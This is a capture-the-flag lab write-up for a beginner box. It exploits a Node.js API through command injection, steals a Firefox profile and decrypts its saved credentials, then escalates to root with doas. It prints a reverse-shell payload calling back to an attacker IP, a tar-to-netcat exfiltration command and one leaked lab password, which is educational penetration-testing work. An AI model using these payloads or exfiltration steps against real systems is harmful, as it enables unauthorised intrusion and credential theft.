 ## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
Challenge showcasing a web app and simple privilege escalation. Can you find the glitch?
_Warning! The box contains blinking images and sensitive words._

This is a simple challenge in which you need to exploit a vulnerable web application and root the machine. It is beginner oriented, some basic JavaScript knowledge would be helpful, but not mandatory. Feedback is always appreciated.

_*Note: It might take a few minutes for the web server to actually start._
```

## IP-Address
```IP-Address
10.201.114.230
```

## RustScan
```bash
$ rustscan -a 10.201.114.230 -b 450 -t 2000 --ulimit 5000 -- -e tun0 
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 60
```
Only 1 Port when we scroll on web I found Glitched Screen and its source Code
```html

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>not allowed</title>

    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }
      body {
        height: 100vh;
        width: 100%;
        background: url('img/glitch.jpg') no-repeat center center / cover;
      }
    </style>
  </head>
  <body>
    <script>
      function getAccess() {
        fetch('/api/access')
          .then((response) => response.json())
          .then((response) => {
            console.log(response);
          });
      }
    </script>
  </body>
</html>
```

I found an End Point where when I crawled I found this 
```bash
$ curl http://10.201.114.230/api/access
{"token":"dGhpc19pc19ub3RfcmVhbA=="}   
```
Its an base64 encoded and when decoded its sounds like
```base64
dGhpc19pc19ub3RfcmVhbA==  :  this_is_not_real
```

after that we didn't go nowhere then we look for any other way and any other authorization but with what it meant I tried to find more stuff to find out more
```bash
$ ffuf -u http://glitch.thm/FUZZ -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -H 'Cookie: token=this_is_not_real'

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://glitch.thm/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 :: Header           : Cookie: token=this_is_not_real
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

js                      
img                     
secret                  
:: Progress: [26583/26583] :: Job [1/1] :: 161 req/sec :: Duration: [0:02:54] :: Errors: 1 ::
```

Got many Directories including `js` , `img`, `secret` lets explore secret folder 
in secret its nothing when we changed the cookie on browser we realized web pages are now changed but not enough which lead to anything but in /api/items there is a hint of different methods so we done this
```bash
$ curl -i -X OPTIONS -H "Cookie: token=this_is_not_real" http://glitch.thm/api/items

HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Thu, 07 Aug 2025 22:40:53 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 13
Connection: keep-alive
X-Powered-By: Express
Allow: GET,HEAD,POST
ETag: W/"d-bMedpZYGrVt1nR4x+qdNZ2GqyRo"

GET,HEAD,POST    
```
And Found out that we can run the `POST` Req. too which leads us to check for files or command execution inside it

```bash
$ wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/api/objects.txt -X POST --hc 404,400 http://glitch.thm/api/items?FUZZ=test
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************
Target: http://glitch.thm/api/items?FUZZ=test
Total requests: 3132
=====================================================================
ID           Response   Lines    Word       Chars       Payload                    
=====================================================================
000000358:   500        10 L     64 W       1081 Ch     "cmd"                      
Total time: 80.66434
Processed Requests: 3132
Filtered Requests: 3131
Requests/sec.: 38.82756
```

we checked and Found `cmd` so then we try to inject Reverse-shell and get some system info
and after trying so many things through one I actually got the reverse-shell 
```bash
$ curl -X POST \
  -H "Cookie: token=this_is_not_real" \
  "http://glitch.thm/api/items?cmd=require('child_process').exec('bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/10.17.36.74/4444%200%3E%261%22')"

vulnerability_exploited [object Object]  
```

I got The Reverse shell
```bash
user@ubuntu:/var/web$ whoami
whoami
user
user@ubuntu:/home$ cd user
cd user
user@ubuntu:~$ ls -la
ls -la
total 48
drwxr-xr-x   8 user user  4096 Jan 27  2021 .
drwxr-xr-x   4 root root  4096 Jan 15  2021 ..
lrwxrwxrwx   1 root root     9 Jan 21  2021 .bash_history -> /dev/null
-rw-r--r--   1 user user  3771 Apr  4  2018 .bashrc
drwx------   2 user user  4096 Jan  4  2021 .cache
drwxrwxrwx   4 user user  4096 Jan 27  2021 .firefox
drwx------   3 user user  4096 Jan  4  2021 .gnupg
drwxr-xr-x 270 user user 12288 Jan  4  2021 .npm
drwxrwxr-x   5 user user  4096 Aug  7 21:40 .pm2
drwx------   2 user user  4096 Jan 21  2021 .ssh
-rw-rw-r--   1 user user    22 Jan  4  2021 user.txt
user@ubuntu:~$ cat user.txt
cat user.txt
[flag omitted]
```

## User Flag
```Flag
[flag omitted]
```

## Now Work on SSH
first looks for file in the user directory 
```bash
user@ubuntu:~$ cd .firefox/b5w4643p.default-release
cd .firefox/b5w4643p.default-release
user@ubuntu:~/.firefox/b5w4643p.default-release$ 
```
we are checking `firefox` to get the user identity or probably cookies which stores his credentials
so we run the nc to received the files on our attacker machine
```bash
nc -lvnp 8888 > firefox_profile.tar
```
run this on attacker machine
and this on receiver /Glitch machine
```bash
tar cf - . | nc 10.17.36.74 8888
```
which connects the both machine and then now we got the files so just close the connection and comes on attacker machine
firstly we got an git-hub repo for decrypt fire-fox credentials from profiles
```github
https://github.com/unode/firefox_decrypt
```
and after running this into our system we got the credentials
```bash
┌──(kali㉿kali)-[~]
└─$ python3 decrypt.py /home/kali/           
2025-08-07 19:38:21,783 - WARNING - profile.ini not found in /home/kali/
2025-08-07 19:38:21,783 - WARNING - Continuing and assuming '/home/kali/' is a profile location

Website:   https://glitch.thm
Username: 'v0id'
Password: 'love_the_void'
```
Use this for change user
```bash
ssh v0id@10.201.29.55
password: [password omitted]
```

but before actually using these credentials we need to make bash stable by
```bash
$python3 -c 'import pty; pty.spawn("/bin/bash")'
cntl+Z
stty raw -echo; fg
Enter
whoami
```
then run 
```bash
$ su v0id 
password: [password omitted]
```
After that we run the #Suid_Command
and Got this 
```bash
v0id@ubuntu:~$ find / -perm -4000 -type f 2>/dev/null
/bin/ping
/bin/mount
/bin/fusermount
/bin/umount
/bin/su
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/at
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/newuidmap
/usr/bin/chsh
/usr/bin/traceroute6.iputils
/usr/bin/pkexec
/usr/bin/newgidmap
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/doas
```
By which I got `doas`  and when I checked the Configuration of `Doas` i found this
```bash
v0id@ubuntu:~$ 
::1              ff02::2          ip6-localnet     ubuntu
fe00::0          ip6-allnodes     ip6-loopback     
ff00::0          ip6-allrouters   ip6-mcastprefix  
ff02::1          ip6-localhost    localhost        
v0id@ubuntu:~$ s^Hwhich doas
which: command not found
v0id@ubuntu:~$ 
v0id@ubuntu:~$ which doas
/usr/local/bin/doas
v0id@ubuntu:~$ 
v0id@ubuntu:~$ doas whoami
Password: 
[password omitted]
v0id@ubuntu:~$ 
```

That I can Run doas as sudo user so lets get the flag
```bash
v0id@ubuntu:~$ doas ls -la /root
Password: 
total 28
drwx------  3 root root 4096 Jan 27  2021 .
drwxr-xr-x 24 root root 4096 Jan 27  2021 ..
lrwxrwxrwx  1 root root    9 Jan 21  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwxr-xr-x  3 root root 4096 Jan 21  2021 .local
-rw-------  1 root root 1079 Jan 27  2021 .viminfo
-rwxr-xr-x  1 root root   80 Jan 27  2021 clean.sh
-rw-r--r--  1 root root   37 Jan  4  2021 root.txt
v0id@ubuntu:~$ doas cat /root/root.txt
Password: 
[flag omitted]
```

## ROOT Flag
```Flag
[flag omitted]
```